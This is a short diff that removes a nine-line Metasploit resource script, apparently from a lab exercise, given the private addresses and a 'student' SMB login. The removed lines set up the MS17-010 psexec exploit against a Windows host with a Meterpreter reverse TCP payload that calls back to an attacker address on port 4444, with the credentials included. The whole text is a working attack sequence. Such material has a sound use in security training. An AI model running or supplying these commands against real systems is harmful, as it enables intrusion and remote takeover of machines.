@@ -1,9 +1,0 @@
-use exploit/windows/smb/ms17_010_psexec
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.33.129
-set LPORT 4444
-set RHOST 192.168.33.132
-set SMBuser student
-set SMBpass Student123
-exploit
-
